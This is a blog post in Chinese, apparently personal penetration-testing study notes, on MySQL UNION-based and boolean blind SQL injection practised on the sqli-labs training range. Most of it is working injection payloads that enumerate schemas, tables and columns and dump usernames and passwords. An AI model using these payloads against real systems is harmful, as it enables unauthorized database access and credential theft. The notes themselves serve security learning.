{"title":"渗透测试笔记 - day11 SQL联合(union)注入和盲注","date":"2023-03-16T17:42:18.087Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day11 SQL联合(union)注入和盲注","updated":"2023-03-17T04:58:09.036Z","content":"<h2 id=\"sql注入中的显示位：\">sql注入中的显示位：<a title=\"#sql注入中的显示位：\" href=\"#sql注入中的显示位：\"></a></h2>\n<p>可以使用?id=-1来ban掉显示位，并且使用union联合查询，来使用显示位。</p>\n<h2 id=\"mysql联合（union）注入：\">mysql联合（union）注入：<a title=\"#mysql联合（union）注入：\" href=\"#mysql联合（union）注入：\"></a></h2>\n<p><strong>寻找注入点：</strong></p>\n<ul>\n<li>与数据库交互</li>\n<li>判断闭合符</li>\n</ul>\n<p><strong>利用order by判断后台数据库的列数</strong></p>\n<p><strong>判断显示位</strong></p>\n<p><strong>利用information_schema.schemate查库名</strong></p>\n<p><strong>利用information_schema.tables查表名</strong></p>\n<p><strong>利用information_schema.colums查字段名</strong></p>\n<p><strong>直接查询想要的数据</strong></p>\n<h3 id=\"练习–sqli靶场less-1：\">练习–sqli靶场Less-1：<a title=\"#练习–sqli靶场less-1：\" href=\"#练习–sqli靶场less-1：\"></a></h3>\n<h4 id=\"order-by判断列数：\">order by判断列数：<a title=\"#order-by判断列数：\" href=\"#order-by判断列数：\"></a></h4>\n<p>payload: ?id=1’ order by 3– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911738.png\" alt=\"image-20220209103931756\" loading=\"lazy\" class=\"φbp\"></p>\n<p>payload: ?id=1’ order by 4– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911445.png\" alt=\"image-20220209103944889\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断显示位：\">判断显示位：<a title=\"#判断显示位：\" href=\"#判断显示位：\"></a></h4>\n<p>payload: ?id=-1’ union select 1,2,3– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911063.png\" alt=\"image-20220209104023213\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"查库名：\">查库名：<a title=\"#查库名：\" href=\"#查库名：\"></a></h4>\n<p>payload: ?id=-1’ union select 1,database(),3– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911987.png\" alt=\"image-20220209211415208\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"查所有库名：（数据库编码导致union联合查询不合法，于是换了个在线的sqli–tab）\">查所有库名：（数据库编码导致union联合查询不合法，于是换了个在线的sqli–tab）<a title=\"#查所有库名：（数据库编码导致union联合查询不合法，于是换了个在线的sqli–tab）\" href=\"#查所有库名：（数据库编码导致union联合查询不合法，于是换了个在线的sqli–tab）\"></a></h4>\n<p>payload: ?id=-1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata)–+</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911933.png\" alt=\"image-20220209214350706\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"查表名：\">查表名：<a title=\"#查表名：\" href=\"#查表名：\"></a></h4>\n<p>payload: ?id=-1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’)–+</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911207.png\" alt=\"image-20220209214635452\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"查列名：\">查列名：<a title=\"#查列名：\" href=\"#查列名：\"></a></h4>\n<p>payload: ?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’),3#</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911108.png\" alt=\"image-20220209221220493\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"获取信息：\">获取信息：<a title=\"#获取信息：\" href=\"#获取信息：\"></a></h4>\n<p>payload: ?id=-1’ union select 1,(select group_concat(concat_ws(char(32,58,32),username,password)) from users),3#</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911415.png\" alt=\"image-20220209221721114\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"sql盲注\">SQL盲注<a title=\"#sql盲注\" href=\"#sql盲注\"></a></h2>\n<h3 id=\"判断数据库个数\">判断数据库个数<a title=\"#判断数据库个数\" href=\"#判断数据库个数\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911534.png\" alt=\"image-20220209144826479\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断第一个数据库名长度\">判断第一个数据库名长度<a title=\"#判断第一个数据库名长度\" href=\"#判断第一个数据库名长度\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911018.png\" alt=\"image-20220209144901207\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断数据库名第一个字母\">判断数据库名第一个字母<a title=\"#判断数据库名第一个字母\" href=\"#判断数据库名第一个字母\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911662.png\" alt=\"image-20220209162439576\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断库中表的个数\">判断库中表的个数<a title=\"#判断库中表的个数\" href=\"#判断库中表的个数\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911194.png\" alt=\"image-20220209162739882\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断库中第一个表名的长度\">判断库中第一个表名的长度<a title=\"#判断库中第一个表名的长度\" href=\"#判断库中第一个表名的长度\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911082.png\" alt=\"image-20220209162940197\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断库里第一个表名的-第一个字符\">判断库里第一个表名的 第一个字符<a title=\"#判断库里第一个表名的-第一个字符\" href=\"#判断库里第一个表名的-第一个字符\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911172.png\" alt=\"image-20220209180230425\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断security.users表的字段个数\">判断security.users表的字段个数<a title=\"#判断security.users表的字段个数\" href=\"#判断security.users表的字段个数\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911909.png\" alt=\"image-20220209181828136\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断security.users表的第一个字段的第一个字符的值\">判断security.users表的第一个字段的第一个字符的值<a title=\"#判断security.users表的第一个字段的第一个字符的值\" href=\"#判断security.users表的第一个字段的第一个字符的值\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911841.png\" alt=\"image-20220209182014957\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断security.users表有多少行数据\">判断security.users表有多少行数据<a title=\"#判断security.users表有多少行数据\" href=\"#判断security.users表有多少行数据\"></a></h3>\n<p><img src=\"C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220209182250200.png\" alt=\"image-20220209182250200 \" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断users表里的第一行username字段的长度\">判断users表里的第一行username字段的长度<a title=\"#判断users表里的第一行username字段的长度\" href=\"#判断users表里的第一行username字段的长度\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911344.png\" alt=\"image-20220209192323404\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"判断user表里的第一行username字段的第一个字符的值\">判断user表里的第一行username字段的第一个字符的值<a title=\"#判断user表里的第一行username字段的第一个字符的值\" href=\"#判断user表里的第一行username字段的第一个字符的值\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911014.png\" alt=\"image-20220209192550457\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"练习–sqli靶场less-8：\">练习–sqli靶场Less-8：<a title=\"#练习–sqli靶场less-8：\" href=\"#练习–sqli靶场less-8：\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911002.png\" alt=\"image-20220209192750107\" loading=\"lazy\" class=\"φbp\"></p>\n<p>输入参数id。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911400.png\" alt=\"image-20220209192818630\" loading=\"lazy\" class=\"φbp\"></p>\n<p>测试其他值。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911486.png\" alt=\"image-20220209192837256\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断闭合。\">判断闭合。<a title=\"#判断闭合。\" href=\"#判断闭合。\"></a></h4>\n<p>payload: id=1’ and 1– -</p>\n<p>和</p>\n<p>payload: id=1’ and 0– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911710.png\" alt=\"image-20220209222721940\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911751.png\" alt=\"image-20220209222754285\" loading=\"lazy\" class=\"φbp\"></p>\n<p>为单引号闭合。</p>\n<h4 id=\"测试数据库个数：5\">测试数据库个数：5<a title=\"#测试数据库个数：5\" href=\"#测试数据库个数：5\"></a></h4>\n<p>payload: ?id=1’ and (select count(schema_name) from information_schema.schemata)=5– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911784.png\" alt=\"image-20220209223151114\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"测试第一个数据库名的长度：18\">测试第一个数据库名的长度：18<a title=\"#测试第一个数据库名的长度：18\" href=\"#测试第一个数据库名的长度：18\"></a></h4>\n<p>payload: ?id=1’ and (select length(schema_name) from information_schema.schemata limit 0,1)=18-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111911823.png\" alt=\"image-20220209223431584\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断第一个库名的第一个字母的：i\">判断第一个库名的第一个字母的：i<a title=\"#判断第一个库名的第一个字母的：i\" href=\"#判断第一个库名的第一个字母的：i\"></a></h4>\n<p>payload: ?id=1’ and substr((select schema_name from information_schema.schemata limit 0,1),1,1)=‘i’-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912967.png\" alt=\"image-20220209223809692\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security库里的所有表的个数：4\">判断security库里的所有表的个数：4<a title=\"#判断security库里的所有表的个数：4\" href=\"#判断security库里的所有表的个数：4\"></a></h4>\n<p>payload: ?id=1’ and (select count(table_name) from information_schema.tables where table_schema=‘security’)=4– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912863.png\" alt=\"image-20220209225646861\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security库里第一个表名的长度：6\">判断security库里第一个表名的长度：6<a title=\"#判断security库里第一个表名的长度：6\" href=\"#判断security库里第一个表名的长度：6\"></a></h4>\n<p>payload: ?id=1’ and (select length(table_name) from information_schema.tables where table_schema=‘security’ limit 0,1)=6– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912811.png\" alt=\"image-20220209225706433\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security库里第一个表的第一个字符：e\">判断security库里第一个表的第一个字符：e<a title=\"#判断security库里第一个表的第一个字符：e\" href=\"#判断security库里第一个表的第一个字符：e\"></a></h4>\n<p>payload: ?id=1’ and substr((select table_name from information_schema.tables where table_schema=‘security’ limit 0,1),1,1)=‘e’– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912282.png\" alt=\"image-20220209225831524\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security.users表的字段个数：3\">判断security.users表的字段个数：3<a title=\"#判断security.users表的字段个数：3\" href=\"#判断security.users表的字段个数：3\"></a></h4>\n<p>payload: ?id=1’ and (select count(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’)=3– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912860.png\" alt=\"image-20220209225910912\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security.users表的第一个字段的长度：2\">判断security.users表的第一个字段的长度：2<a title=\"#判断security.users表的第一个字段的长度：2\" href=\"#判断security.users表的第一个字段的长度：2\"></a></h4>\n<p>payload: ?id=1’ and (select length(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’ limit 0,1)=2– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912069.png\" alt=\"image-20220209225927609\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security.users表的第一个字段的第一个字符：i\">判断security.users表的第一个字段的第一个字符：i<a title=\"#判断security.users表的第一个字段的第一个字符：i\" href=\"#判断security.users表的第一个字段的第一个字符：i\"></a></h4>\n<p>payload: ?id=1’ and substr((select column_name from information_schema.columns where table_schema=‘security’ and table_name=‘users’ limit 0,1),1,1)=‘i’– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912958.png\" alt=\"image-20220209225948481\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断security.users表有多少行数据：8\">判断security.users表有多少行数据：8<a title=\"#判断security.users表有多少行数据：8\" href=\"#判断security.users表有多少行数据：8\"></a></h4>\n<p>payload: ?id=1’ and (select count(username) from security.users)=8– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912027.png\" alt=\"image-20220209230007172\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断user表里的第一行username字段的长度：4\">判断user表里的第一行username字段的长度：4<a title=\"#判断user表里的第一行username字段的长度：4\" href=\"#判断user表里的第一行username字段的长度：4\"></a></h4>\n<p>payload: ?id=1’ and (select length(username) from security.users limit 0,1)=4– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912009.png\" alt=\"image-20220209230021958\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"判断user表里的第一行username字段的第一个字符：d\">判断user表里的第一行username字段的第一个字符：d<a title=\"#判断user表里的第一行username字段的第一个字符：d\" href=\"#判断user表里的第一行username字段的第一个字符：d\"></a></h4>\n<p>payload: ?id=1’ and substr((select username from security.users limit 0,1),1,1)=‘d’– -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111912718.png\" alt=\"image-20220209230035662\" loading=\"lazy\" class=\"φbp\"></p>\n","prev":{"title":"渗透测试笔记 - day12 时间盲注、报错注入与post注入","link":"2023/03/16/渗透测试笔记 - day12 时间盲注、报错注入与post注入"},"next":{"title":"渗透测试笔记 - day10 SQL注入","link":"2023/03/16/渗透测试笔记 - day10 SQL注入"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day11 SQL联合(union)注入和盲注/","toc":[{"id":"sql注入中的显示位：","title":"sql注入中的显示位：","index":"1"},{"id":"mysql联合（union）注入：","title":"mysql联合（union）注入：","index":"2","children":[{"id":"练习–sqli靶场less-1：","title":"练习–sqli靶场Less-1：","index":"2.1"}]},{"id":"sql盲注","title":"SQL盲注","index":"3","children":[{"id":"判断数据库个数","title":"判断数据库个数","index":"3.1"},{"id":"判断第一个数据库名长度","title":"判断第一个数据库名长度","index":"3.2"},{"id":"判断数据库名第一个字母","title":"判断数据库名第一个字母","index":"3.3"},{"id":"判断库中表的个数","title":"判断库中表的个数","index":"3.4"},{"id":"判断库中第一个表名的长度","title":"判断库中第一个表名的长度","index":"3.5"},{"id":"判断库里第一个表名的-第一个字符","title":"判断库里第一个表名的 第一个字符","index":"3.6"},{"id":"判断security.users表的字段个数","title":"判断security.users表的字段个数","index":"3.7"},{"id":"判断security.users表的第一个字段的第一个字符的值","title":"判断security.users表的第一个字段的第一个字符的值","index":"3.8"},{"id":"判断security.users表有多少行数据","title":"判断security.users表有多少行数据","index":"3.9"},{"id":"判断users表里的第一行username字段的长度","title":"判断users表里的第一行username字段的长度","index":"3.10"},{"id":"判断user表里的第一行username字段的第一个字符的值","title":"判断user表里的第一行username字段的第一个字符的值","index":"3.11"},{"id":"练习–sqli靶场less-8：","title":"练习–sqli靶场Less-8：","index":"3.12"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day11 SQL联合(union)注入和盲注/\" title=\"渗透测试笔记 - day11 SQL联合(union)注入和盲注\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day11 SQL联合(union)注入和盲注/</a>"},"reading_time":"1202 words in 8 min"}